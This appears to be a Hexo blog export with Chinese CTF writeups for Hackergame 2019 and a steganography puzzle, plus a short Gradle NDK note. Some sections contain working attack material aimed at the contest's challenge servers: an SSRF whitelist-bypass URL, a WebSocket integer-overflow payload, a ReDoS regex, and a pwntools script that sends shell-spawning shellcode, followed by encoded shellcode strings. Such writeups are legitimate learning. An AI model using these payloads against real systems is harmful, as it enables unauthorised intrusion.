    <content><![CDATA[<h2 id="来自中老年的表情包"><a href="#来自中老年的表情包" class="headerlink" title="来自中老年的表情包"></a>来自中老年的表情包</h2><p>图片如下（可以自己尝试分析）<br><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/friend_ctf_1.gif"></p>
<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>只有一个gif，惯例<code>010Editor</code>打开，文件尾有个压缩包<br>提取之，不出意外的有密码，而且并不是伪加密</p>
<h3 id="尝试"><a href="#尝试" class="headerlink" title="尝试"></a>尝试</h3><p>输入新年快乐，密码错误<br>输入happy，密码错误<br>输入happy2019，密码错误<br>难道隐藏在图片里？于是PS提取之，得到6张png<br>一番尝试后没有任何收获（陷入僵局.jpg<br>甚至怀疑是否在网页中含有密码，询问作者，得到回复：</p>
<blockquote>
<p>暴力出奇迹</p>
</blockquote>
<h3 id="得到最终的神秘数字"><a href="#得到最终的神秘数字" class="headerlink" title="得到最终的神秘数字"></a>得到最终的神秘数字</h3><p>然后，爆破得到了密码，89ms= =<br>解压后得到一个wav文件，播放，发现是电话拨号音<br>使用AU打开并显示频谱（Shift+D），对照DTMF表得到对应数字<br><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/friend_ctf_2.png"></p>
<h3 id="DTMF对照表"><a href="#DTMF对照表" class="headerlink" title="DTMF对照表"></a>DTMF对照表</h3><table>
<thead>
<tr>
<th>低频 \ 高频(Hz)</th>
<th align="center">1209</th>
<th align="center">1336</th>
<th align="center">1477</th>
<th align="center">1633</th>
</tr>
</thead>
<tbody><tr>
<td>697</td>
<td align="center">1</td>
<td align="center">2</td>
<td align="center">3</td>
<td align="center">A</td>
</tr>
<tr>
<td>770</td>
<td align="center">4</td>
<td align="center">5</td>
<td align="center">6</td>
<td align="center">B</td>
</tr>
<tr>
<td>852</td>
<td align="center">7</td>
<td align="center">8</td>
<td align="center">9</td>
<td align="center">C</td>
</tr>
<tr>
<td>941</td>
<td align="center">*</td>
<td align="center">0</td>
<td align="center">#</td>
<td align="center">D</td>
</tr>
</tbody></table>
<h2 id="—-华丽（并不）的分割线—"><a href="#—-华丽（并不）的分割线—" class="headerlink" title="—-华丽（并不）的分割线—-"></a>—-华丽（并不）的分割线—-</h2><p>最后祝大家新年快乐！</p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Hackersgame 2019 的一些失败尝试及复现</title>
    <url>/2019/10/22/hackersgame-2019-fails/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>在之前比赛时尝试的基础上，参考<a href="https://github.com/ustclug/hackergame2019-writeups/">官方题解</a>进行复现</p>
<span id="more"></span>
<h2 id="（√）天书残篇"><a href="#（√）天书残篇" class="headerlink" title="（√）天书残篇"></a>（√）天书残篇</h2><h3 id="Try"><a href="#Try" class="headerlink" title="Try"></a>Try</h3><p>三种字符，统计结果:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">20 00100000 : 2100</span><br><span class="line">09 00001001 : 1353</span><br><span class="line">0a 00001010 : 646</span><br></pre></td></tr></table></figure>
<p>各种尝试无果（因为以为是密码学的题，方向完全错了）<br>没想到跟去年一样，又是一种语言</p>
<h3 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h3><p>使用<a href="https://vii5ard.github.io/whitespace/">在线反编译器</a>，单步调试分析<br>首先把<code>Please input your flag:</code>push入栈，然后读取输入<br>随便输入一个值，进行一系列操作后打印<code>I think your flag is incorrect!</code><br>该字符在<code>label_6</code>入栈，所以回溯即可找到判断代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">label_4:</span><br><span class="line">push 2</span><br><span class="line">add</span><br><span class="line">push 127</span><br><span class="line">sub</span><br><span class="line">jz label_5</span><br><span class="line">jmp label_6</span><br></pre></td></tr></table></figure>
<p>127-2=125, 对应flag的最后一个字符<code>&#125;</code>，dump出ascii码，加2后转换，最后倒序即可</p>
<h2 id="（√）无限猴子定理"><a href="#（√）无限猴子定理" class="headerlink" title="（√）无限猴子定理"></a>（√）无限猴子定理</h2><h3 id="Try-1"><a href="#Try-1" class="headerlink" title="Try"></a>Try</h3><p>发现有一些字符不会被随机到</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">nolist = [<span class="number">3114</span>, <span class="number">6563</span>, <span class="number">10012</span>, <span class="number">13461</span>, <span class="number">16910</span>, <span class="number">20359</span>, <span class="number">23808</span>, <span class="number">27257</span>, <span class="number">30706</span>, <span class="number">34155</span>, <span class="number">37604</span>, <span class="number">41053</span>, <span class="number">44502</span>, <span class="number">47951</span>, <span class="number">51400</span>, <span class="number">54849</span>, <span class="number">58298</span>, <span class="number">61747</span>, <span class="number">65196</span>, <span class="number">65531</span>, <span class="number">65532</span>, <span class="number">65533</span>, <span class="number">65534</span>]</span><br><span class="line"><span class="string">&quot;+a+8tGa0edrn++eLArC&quot;</span></span><br></pre></td></tr></table></figure>
<p>各种拼接，提交无果<br>没想到是直接传入进行取值 = =</p>
<h3 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h3><p>修改代码为</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">i = <span class="built_in">iter</span>(random_iter(<span class="number">3114</span>))</span><br></pre></td></tr></table></figure>
<p>输出<code>flag&#123;Generat0r+A+8ad+LC&#125;</code><br>根据条件：</p>
<blockquote>
<p>flag 一定代表一串有意义的英文单词序列，但本题完全不需要任何程度的基于机器的自然语言识别。<br>和本次比赛的其他 flag 类似，本题的对应 flag 中可能有英文字母被替换混淆。<br>flag 代表的第一个英文单词既不会是名词，也不会是形容词。</p>
</blockquote>
<p>所以为<br><code>flag&#123;A+8ad+LC+Generat0r&#125;</code><br>PS: 个人拼接出了一个<code>A+CLear+Garden+80t</code><br>感觉还挺正常的，不过含义跟题目无关 = =</p>
<h2 id="（√）失落的圣物"><a href="#（√）失落的圣物" class="headerlink" title="（√）失落的圣物"></a>（√）失落的圣物</h2><h3 id="Try-2"><a href="#Try-2" class="headerlink" title="Try"></a>Try</h3><p>分析完kvm执行流程之后，由于当时没有安装虚拟环境，就暂时搁置了<br>没有直接使用IDA分析系统镜像，不然应该能做出来</p>
<h3 id="Solution-2"><a href="#Solution-2" class="headerlink" title="Solution"></a>Solution</h3><p> <code>run_long_mode</code>中把系统镜像复制到内存中，然后进行装载<br>在此处下断可以分析<code>binary_guest64_img_start</code>（按C强制转换为函数）<br>首先加载了一些数据，再调用<code>sub_5569F1E0215B</code>函数进行解密，观察得知算法是<code>XXTEA</code>算法（根据常数<code>0x9E3779B9</code> <code>0x61C88647</code>以及<code>6 + 52 / n</code>）<br>dump出数据解密即可</p>
<h2 id="（X）宇宙终极问题"><a href="#（X）宇宙终极问题" class="headerlink" title="（X）宇宙终极问题"></a>（X）宇宙终极问题</h2><h3 id="Try-3"><a href="#Try-3" class="headerlink" title="Try"></a>Try</h3><p>没搜到分解整数的网页，GG</p>
<h3 id="Solution-3"><a href="#Solution-3" class="headerlink" title="Solution"></a>Solution</h3><h4 id="Everything"><a href="#Everything" class="headerlink" title="Everything"></a>Everything</h4><p><a href="https://www.alpertron.com.ar/FSQUARES.HTM">分解成平方和</a><br><a href="https://www.alpertron.com.ar/FCUBES.HTM">分解成立方和</a></p>
<h2 id="（X）不同寻常的Python考试"><a href="#（X）不同寻常的Python考试" class="headerlink" title="（X）不同寻常的Python考试"></a>（X）不同寻常的Python考试</h2><h3 id="Try-4"><a href="#Try-4" class="headerlink" title="Try"></a>Try</h3><p>基本考察python的内建函数和各种数据类型之间的转换，<br>对python不是很熟，一半都没做出来….<br>可在github搜索<code>wtf moments in python</code>参考</p>
<h3 id="Solution-4"><a href="#Solution-4" class="headerlink" title="Solution"></a>Solution</h3><p>to be added…</p>
<h2 id="（X）无法利用的漏洞"><a href="#（X）无法利用的漏洞" class="headerlink" title="（X）无法利用的漏洞"></a>（X）无法利用的漏洞</h2><h3 id="Try-5"><a href="#Try-5" class="headerlink" title="Try"></a>Try</h3><p>IDA打开，发现存在后门函数，所以关键是要调整EIP到这里</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unsigned __int64 sub_96B()</span><br><span class="line">&#123;</span><br><span class="line">  char buf; // [rsp+0h] [rbp-10h]</span><br><span class="line">  char v2; // [rsp+7h] [rbp-9h]</span><br><span class="line">  unsigned __int64 v3; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(0x28u);</span><br><span class="line">  puts(&quot;that&#x27;s impossible!&quot;);</span><br><span class="line">  read(0, &amp;buf, 7uLL);</span><br><span class="line">  v2 = 0;</span><br><span class="line">  system(&amp;buf);</span><br><span class="line">  return __readfsqword(0x28u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>checksec</code>查询，发现保护全开，所以不能简单栈溢出，需要用到一些高级操作，第一次做pwn，没时间研究了</p>
<h3 id="Solution-5"><a href="#Solution-5" class="headerlink" title="Solution"></a>Solution</h3><p>to be added…</p>
<h2 id="（X）驴啃计算器"><a href="#（X）驴啃计算器" class="headerlink" title="（X）驴啃计算器"></a>（X）驴啃计算器</h2><h3 id="Try-6"><a href="#Try-6" class="headerlink" title="Try"></a>Try</h3><p>可以使用meet in middle算法进行搜索，没写代码实现</p>
<h3 id="Solution-6"><a href="#Solution-6" class="headerlink" title="Solution"></a>Solution</h3><p>to be added…</p>
<h2 id="（X）十次方根"><a href="#（X）十次方根" class="headerlink" title="（X）十次方根"></a>（X）十次方根</h2><h3 id="Try-7"><a href="#Try-7" class="headerlink" title="Try"></a>Try</h3><blockquote>
<p>「只要你的输入 n 代入后满足约束条件，flag 就是你的。」</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = <span class="number">130095999494467643631574289251374479743427759332282644620931023932981730612064829262332840253969261363881910701276769455728130421459878658660627330362688856751252524519341435317968272275310598639991033512763704530123231772642623291899534454658707761230166809620539187116816778418242273580873637781313957589597</span></span><br><span class="line">y = <span class="number">116513882455567447431772208851676203256471727099349255694179213039239989833646726805040167642952589899809273716764673737423792812107737304956679717082391151505476360762847773608327055926832394948293052633869637754201186227370594688119795413400655007893009882742908697688490841023621108562593724732469462968731</span></span><br><span class="line">z = <span class="number">88688615046438957657148589794574470139777919686383514327296565433247300792803913489977671293854830459385807133302995575774658605472491904258624914486448276269854207404533062581134557448023142028865220726281791025833570337140263511960407206818858439353134327592503945131371190285416230131136007578355799517986306208039490339159501009668785839201465041101739825050371023956782364610889969860432267781626941824596468923354157981771773589236462813563647577651117020694251283103175874783965004467136515096081442018965974870665038880840823708377340101510978112755669470752689525778937276250835072011344062132449232775717960070624563850487919381138228636278647776184490240264110748648486121139328569423969642059474027527737521891542567351630545570488901368570734520954996585774666946913854038917494322793749823245652065062604226133920469926888309742466030087045251385865707151307850662127591419171619721200858496299127088429333831383287417361021420824398501423875648199373623572614151830871182111045650469239575676312393555191890749537174702485617397506191658938798937462708198240714491454507874141432982611857838173469612147092460359775924447976521509874765598726655964369735759375793871985156532139719500175158914354647101621378769238233</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    n = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">    <span class="keyword">if</span> <span class="number">0</span> &lt; n &lt; z <span class="keyword">and</span> n ** <span class="number">10</span> % (x * y * y * y) == z:</span><br><span class="line">        flag = <span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(n)[<span class="number">2</span>:]).decode()</span><br><span class="line">        <span class="keyword">if</span> flag.startswith(<span class="string">&quot;flag&quot;</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Flag:&quot;</span>, flag[:<span class="number">32</span>])</span><br><span class="line">            exit()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Wrong!&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>可以得出约束条件:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span> &lt; n &lt; z</span><br><span class="line"><span class="built_in">pow</span>(n,<span class="number">10</span>,(x*y*y*y)) == z</span><br><span class="line">flag = <span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(n)[<span class="number">2</span>:]).decode()<span class="comment">#每一位字符都是可打印的,即0x20-0x7f</span></span><br><span class="line">flag.startswith(<span class="string">&quot;flag&quot;</span>) <span class="comment"># 即转化成十六进制以666c6167开头</span></span><br></pre></td></tr></table></figure>
<p>尝试使用z3约束器求解，跑不出结果，于是继续分析<br>注意到x和y都是309位的数字，猜测是使用<code>random_prime</code>函数生成的，使用sympy进行素性测试，发现确实是素数，于是想到rsa算法</p>
<blockquote>
<p>加密明文m：c = pow(m, e, N)，得到的c即为密文<br>解密密文c：m = pow(c, d, N)，得到的m即为明文</p>
</blockquote>
<p>已知约束<code>pow(n,10,(x*y*y*y)) == z</code>，也就是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">e=10, N=(x * y * y * y), c = z</span><br></pre></td></tr></table></figure>
<p>所以需要把d求出来，才能解密出flag<br>参考rsa中d的生成算法：</p>
<blockquote>
<p>计算φ = (p-1) * (q-1) 即N的欧拉函数，然后选择一个e (1&lt;e&lt;φ)，且e和φ互质<br>取e的模反数为d，计算方法: d=e^-1 mod (p-1)(q-1)</p>
</blockquote>
<p>本题已知<code>e=10</code>，所以关键在于求出φ<br>根据欧拉函数定义，计算出$φ(n)=(p-1) *(q-1)*q * q$</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">205777062822855196204557259074204338863038877637508486991101948465308135853880119111298068410289942295119552877315995448483302052425384602998841067955989953532845673085938551734361886384957239104845083274605794116053692298274075954846274045387790432296780713156217096516442834594918827862540823117379119661764619290734086685907363261513580137663874870284095783503058795808164041247072364419239866222057499427540588679887524968959272826964100134564431765857617785871632054905292345277712079341783082012212706688061094998296147702680236639550101982604019253080207087085614227084574908094202693850747452248476172169172988025295138860040086705252643613747942616761475965636304045008301477874434092164471640329043047768806832761725356175958693573828929796609421973244181058162273249948507989984964176737160126969440713901163378524487913052802448828878557913452548831503041309225019783292421104846983044294553488830895031906282691942377484591183173552068835852478319307261641554425552804754002477048056545092966316064552607875541020758891571430248441211430296946142454465137812875546208385522654977654027563707207023062358869162899849260716308794744184245547839510008610288699881144289526736391055307563993152525081699163811563126251241880</span><br></pre></td></tr></table></figure>
<p>使用gmpy2寻找逆元，提示逆元不存在<br>尝试暴力搜索，没得到结果，GG<br>(没注意到是因为phi和e不互素)</p>
<h3 id="Solution-7"><a href="#Solution-7" class="headerlink" title="Solution"></a>Solution</h3><p>中国剩余定理是啥 = =</p>
<h2 id="（X）2077-海底捞针"><a href="#（X）2077-海底捞针" class="headerlink" title="（X）2077 海底捞针"></a>（X）2077 海底捞针</h2><h3 id="Try-8"><a href="#Try-8" class="headerlink" title="Try"></a>Try</h3><p>no try, too hard for me</p>
<h3 id="Solution-8"><a href="#Solution-8" class="headerlink" title="Solution"></a>Solution</h3><p>to be added…</p>
<h2 id="（X）大整数分解锦标赛"><a href="#（X）大整数分解锦标赛" class="headerlink" title="（X）大整数分解锦标赛"></a>（X）大整数分解锦标赛</h2><h3 id="Try-9"><a href="#Try-9" class="headerlink" title="Try"></a>Try</h3><p>分析sympy的源码，发现调用的是random库来实现的随机，继续往下分析<br>最终跟踪到Python源码的<code>_randommodule.c</code><br>随机数生成采用mt19937算法，而Python默认是获取系统的随机值，所以需要对状态进行恢复<br>可以通过不断调用Help函数来生成比特，然后就卡这了</p>
<h3 id="Solution-9"><a href="#Solution-9" class="headerlink" title="Solution"></a>Solution</h3><p>to be added…</p>
<h2 id="（X）Flag-红包"><a href="#（X）Flag-红包" class="headerlink" title="（X）Flag 红包"></a>（X）Flag 红包</h2><h3 id="Try-10"><a href="#Try-10" class="headerlink" title="Try"></a>Try</h3><p>设计一个AI来对抗它，没写代码实现<br>结果直接左右互搏？！</p>
<h3 id="Solution-10"><a href="#Solution-10" class="headerlink" title="Solution"></a>Solution</h3><p>to be added…</p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Gradle默认NDK版本及配置</title>
    <url>/2022/06/02/gradle-default-ndk-version/</url>
    <content><![CDATA[<h2 id="NDK默认版本"><a href="#NDK默认版本" class="headerlink" title="NDK默认版本"></a>NDK默认版本</h2><table>
<thead>
<tr>
<th>7.0</th>
<th>4.2</th>
<th>4.1</th>
<th>4.0</th>
<th>3.6</th>
</tr>
</thead>
<tbody><tr>
<td>21.4.7075529</td>
<td>21.4.7075529</td>
<td>21.1.6352462</td>
<td>21.0.6113669</td>
<td>20.0.5594570</td>
</tr>
</tbody></table>
<h2 id="手动指定版本"><a href="#手动指定版本" class="headerlink" title="手动指定版本"></a>手动指定版本</h2><p>修改<code>build.gradle</code>，设置<code>ndkVersion</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">android &#123;</span><br><span class="line">    ndkVersion <span class="string">&quot;24.0.8215888&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://developer.android.google.cn/studio/projects/install-ndk?hl=zh-cn#default-ndk-per-agp">每个 AGP 版本对应的默认 NDK 版本</a></p>
]]></content>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title>Hackersgame 2019 部分writeup</title>
    <url>/2019/10/22/hackersgame-2019-writeup/</url>
    <content><![CDATA[<h2 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h2><p>修改页面源码以及js代码，去掉disabled描述符，使用Fiddler替换，然后强制刷新页面<br>即可点击提交按钮得到flag</p>
<h2 id="白与夜"><a href="#白与夜" class="headerlink" title="白与夜"></a>白与夜</h2><p>图片是qq中常见的隐藏图，个人做这题时是用的手机<br>直接使用自带相册打开即可看到flag</p>
<h2 id="信息安全-2077"><a href="#信息安全-2077" class="headerlink" title="信息安全 2077"></a>信息安全 2077</h2><p>注意到页面源码中设置了<code>If-Unmodified-Since</code>为当前时间，而返回的<code>Last-Modified</code>是<code>Fri, 01 Oct 2077 00:00:00 GMT</code>，把<code>If-Unmodified-Since</code>改为该值即可获得flag</p>
<span id="more"></span>
<h2 id="宇宙终极问题（部分）"><a href="#宇宙终极问题（部分）" class="headerlink" title="宇宙终极问题（部分）"></a>宇宙终极问题（部分）</h2><h3 id="42"><a href="#42" class="headerlink" title="42"></a>42</h3><p>题目要求给出$x^3+y^3+z^3=42$的整数解，直接百度得到答案</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">（-80538738812075974）^3+80435758145817515^3+12602123297335631^3=42</span><br></pre></td></tr></table></figure>
<p>输入即可得到flag</p>
<h2 id="网页读取器"><a href="#网页读取器" class="headerlink" title="网页读取器"></a>网页读取器</h2><p>查看源代码，发现check_hostname时会把@之前的字符删掉</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_hostname</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> whitelist_scheme:</span><br><span class="line">        <span class="keyword">if</span> url.startswith(i):</span><br><span class="line">            url = url[<span class="built_in">len</span>(i):]  <span class="comment"># strip scheme</span></span><br><span class="line">            url = url[url.find(<span class="string">&quot;@&quot;</span>) + <span class="number">1</span>:]  <span class="comment"># strip userinfo</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> url.find(<span class="string">&quot;/&quot;</span>) == -<span class="number">1</span>:</span><br><span class="line">                url = url[:url.find(<span class="string">&quot;/&quot;</span>)]  <span class="comment"># strip parts after authority</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> url.find(<span class="string">&quot;:&quot;</span>) == -<span class="number">1</span>:</span><br><span class="line">                url = url[:url.find(<span class="string">&quot;:&quot;</span>)]  <span class="comment"># strip port</span></span><br><span class="line">            <span class="keyword">if</span> url <span class="keyword">not</span> <span class="keyword">in</span> whitelist_hostname:</span><br><span class="line">                <span class="keyword">return</span> (<span class="literal">False</span>, <span class="string">&quot;hostname &#123;&#125; not in whitelist&quot;</span>.<span class="built_in">format</span>(url))</span><br><span class="line">            <span class="keyword">return</span> (<span class="literal">True</span>, <span class="string">&quot;ok&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> (<span class="literal">False</span>, <span class="string">&quot;scheme not in whitelist, only &#123;&#125; allowed&quot;</span>.<span class="built_in">format</span>(whitelist_scheme))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>构造<code>http://web1/flag@example.com</code>提交，发现不对，于是加了个问号<br>即<code>http://web1/flag?@example.com</code>得到flag</p>
<h2 id="达拉崩吧大冒险"><a href="#达拉崩吧大冒险" class="headerlink" title="达拉崩吧大冒险"></a>达拉崩吧大冒险</h2><p>查看页面源码可知，使用WebSocket进行数据传输，用户端只能发送数字作为当前选项<br>测试发现在料理大市场买鸡时，可以购买负数的鸡（通过控制台<code>ws.send(-1)发现</code>），猜测此处存在负数溢出漏洞。<br>完整流程代码:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ws.send(<span class="number">0</span>);ws.send(<span class="number">0</span>);<span class="comment">//进入[&quot;料理大市场&quot;,&quot;打怪升级&quot;,&quot;去恶龙洞穴&quot;]选项</span></span><br><span class="line">ws.send(<span class="number">0</span>);ws.send(-<span class="number">3223372036854775807</span>);<span class="comment">//选择料理大市场并购买负数只鸡</span></span><br><span class="line">ws.send(<span class="number">2</span>);<span class="comment">//进入恶龙洞穴</span></span><br><span class="line">ws.send(<span class="number">0</span>);<span class="comment">//对话</span></span><br><span class="line">ws.send(<span class="number">2</span>);<span class="comment">//得到flag</span></span><br></pre></td></tr></table></figure>
<p>此处使用的负数是<code>MAX_INT64</code> (<code>9223372036854775807</code>)的最高位改成3，一次即可溢出成功，攻击变成了<code>2329883889435671600</code></p>
<h2 id="Happy-LUG"><a href="#Happy-LUG" class="headerlink" title="Happy LUG"></a>Happy LUG</h2><p>??的Punycode编码是<code>xn--g28h</code>，故组合起来的域名为<br><code>xn--g28h.hack.ustclug.org</code><br>查询该域名的txt记录即可得到flag（手机端可使用<code>Network Tools</code>进行查询）</p>
<h2 id="正则验证器"><a href="#正则验证器" class="headerlink" title="正则验证器"></a>正则验证器</h2><p>题目说需要找到运行时间超过一秒的正则表达式，查看源码发现还有长度限制<br>正则表达式长度不能大于6，匹配的文本长度不能大于24<br>个人直接百度找到了答案:<br><a href="http://ju.outofmemory.cn/entry/82230">如何中断一个长时间运行的“无限”Java正则表达式</a><br>正则：<code>(0*)*A</code>，字符：<code>00000000000000000000000</code><br>提交得到flag</p>
<h2 id="小巧玲珑的-ELF"><a href="#小巧玲珑的-ELF" class="headerlink" title="小巧玲珑的 ELF"></a>小巧玲珑的 ELF</h2><p>IDA打开，查看伪代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> __asm</span><br><span class="line">  &#123;</span><br><span class="line">    syscall; LINUX - sys_write</span><br><span class="line">    syscall; LINUX - sys_read</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">45</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    buf[i] += <span class="number">2</span> * i;</span><br><span class="line">    buf[i] ^= i;</span><br><span class="line">    buf[i] -= i;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">45</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( buf[j] != *(&amp;v0 + j) )</span><br><span class="line">      __asm &#123; syscall; LINUX - sys_exit &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  __asm</span><br><span class="line">  &#123;</span><br><span class="line">    syscall; LINUX - sys_write</span><br><span class="line">    syscall; LINUX - sys_exit</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中v0到v45是数据段，需要dump出来（建议使用脚本）<br>这题有两种解法：爆破或者逆运算得出的flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data = [<span class="number">0x66</span>,<span class="number">0x6e</span>,<span class="number">0x65</span>,<span class="number">0x6b</span>,<span class="number">0x83</span>,<span class="number">0x4e</span>,<span class="number">0x6d</span>,<span class="number">0x74</span>,<span class="number">0x85</span>,<span class="number">0x7a</span>,<span class="number">0x6f</span>,<span class="number">0x57</span>,<span class="number">0x91</span>,<span class="number">0x73</span>,<span class="number">0x90</span>,<span class="number">0x4f</span>,<span class="number">0x8d</span>,<span class="number">0x7f</span>,<span class="number">0x63</span>,<span class="number">0x36</span>,<span class="number">0x6c</span>,<span class="number">0x6e</span>,<span class="number">0x87</span>,<span class="number">0x69</span>,<span class="number">0xa3</span>,<span class="number">0x6f</span>,<span class="number">0x58</span>,<span class="number">0x73</span>,<span class="number">0x66</span>,<span class="number">0x56</span>,<span class="number">0x93</span>,<span class="number">0x9f</span>,<span class="number">0x69</span>,<span class="number">0x70</span>,<span class="number">0x38</span>,<span class="number">0x76</span>,<span class="number">0x71</span>,<span class="number">0x78</span>,<span class="number">0x6f</span>,<span class="number">0x63</span>,<span class="number">0xc4</span>,<span class="number">0x82</span>,<span class="number">0x84</span>,<span class="number">0xbe</span>,<span class="number">0xbb</span>,<span class="number">0xcd</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">46</span>):</span><br><span class="line">    x = data[i]</span><br><span class="line">    x += i</span><br><span class="line">    x ^= i</span><br><span class="line">    x -= <span class="number">2</span> * i</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(x),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\nbrute&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">46</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        tmp_x = x</span><br><span class="line">        x += <span class="number">2</span> * i</span><br><span class="line">        x ^= i</span><br><span class="line">        x -= i</span><br><span class="line">        <span class="keyword">if</span>(x==data[i]):</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(tmp_x),end = <span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="Shell三骇客"><a href="#Shell三骇客" class="headerlink" title="Shell三骇客"></a>Shell三骇客</h2><p>本题是<code>ShellCode</code>构造题，只要传入的<code>ShellCode</code>满足过滤条件就会被执行</p>
<h3 id="ShellHacker1"><a href="#ShellHacker1" class="headerlink" title="ShellHacker1"></a>ShellHacker1</h3><p>64位程序<br>没有任何过滤，使用<code>pwntools</code>生成<code>shellcode</code>，发送即可</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line"><span class="comment">#print(shellcode)</span></span><br><span class="line">token = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment">#sh = process(&#x27;chall1&#x27;)</span></span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&#x27;202.38.93.241&#x27;</span>,<span class="number">10000</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;Please input your token: &quot;</span>)</span><br><span class="line">sh.sendline(token)</span><br><span class="line"></span><br><span class="line">sh.send(shellcode)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="ShellHacker2"><a href="#ShellHacker2" class="headerlink" title="ShellHacker2"></a>ShellHacker2</h3><p>32位程序，逆向得知call地址为eax<br>限制输入为数字和大写字母<br>使用<code>msfvenom</code>对shellcode编码<br>得到</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">shellcode=<span class="string">&quot;PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIRJSXCXVO6OVOCCBH6OE2BI2NRJTKV8MYM36QHILY8MK0AA&quot;</span></span><br></pre></td></tr></table></figure>
<p>发送即可getshell</p>
<h3 id="ShellHacker3"><a href="#ShellHacker3" class="headerlink" title="ShellHacker3"></a>ShellHacker3</h3><p>64位程序<br>限制输入为可打印字符<br>使用 <a href="https://github.com/SkyLined/alpha3">ALPHA3</a> 对shellcode编码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python2 ALPHA3.py x64 ascii mixedcase RAX --input=sc.bin</span><br></pre></td></tr></table></figure>
<p>得到</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">shellcode=<span class="string">&quot;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C101k2m0h2r4y5p164y390U050C&quot;</span></span><br></pre></td></tr></table></figure>
<p>发送即可getshell</p>
